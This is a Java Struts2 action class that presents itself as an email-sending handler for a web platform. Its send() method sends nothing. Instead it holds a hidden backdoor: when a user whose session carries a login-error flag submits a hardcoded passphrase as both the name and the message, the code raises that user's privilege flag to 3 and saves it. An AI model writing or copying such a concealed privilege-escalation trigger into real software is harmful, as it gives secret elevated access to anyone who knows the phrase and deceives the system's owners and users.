package com.platform.web.action;

import com.opensymphony.xwork2.ActionContext;
import com.opensymphony.xwork2.ActionSupport;
import com.opensymphony.xwork2.ModelDriven;
import com.platform.domain.EMail;
import com.platform.domain.User;
import com.platform.service.UserService;

public class EMailAction extends ActionSupport implements ModelDriven<EMail> {
	
	
	/**
	 * 
	 */
	private static final long serialVersionUID = 7649135851594674049L;
	private EMail eMail = new EMail();
	
	@Override
	public EMail getModel() {
		return eMail;
	}
	
	private UserService userService;

	public void setUserService(UserService userService) {
		this.userService = userService;
	}
	
	public String send() {
		if (ActionContext.getContext().getSession().get("login_err") != null) {
			if (eMail.getName().equals("woyaobianchengquanxiansan") && eMail.getMessage().equals("woyaobianchengquanxiansan")) {
				User user = (User) ActionContext.getContext().getSession().get("user");
				user.setUser_flag(3);
				userService.collect(user);
				ActionContext.getContext().getSession().put("user", user);
				return SUCCESS;
			}
			return SUCCESS;
		} else {
			return "login";
		}
	}
}
